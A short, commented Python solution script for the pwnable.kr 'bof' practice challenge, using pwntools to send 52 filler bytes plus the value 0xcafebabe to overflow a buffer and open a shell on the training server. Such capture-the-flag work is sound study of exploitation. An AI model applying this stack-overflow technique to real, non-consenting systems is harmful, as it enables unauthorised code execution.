#First we import pwntools
from pwn import *

#Then we establish the remote connection to the server
conn = remote("pwnable.kr", 9000)

#Now we setup the payload which we will send to the challenge. Pwntools has a cool feature to help us pack the hex value in a 32 bit form that the server can read (p32).
payload = "1"*52 + p32(0xcafebabe)

#Now we send the payload
conn.sendline(payload)

#Now we drop down to an interactive shell so we can interact with our shell
conn.interactive()
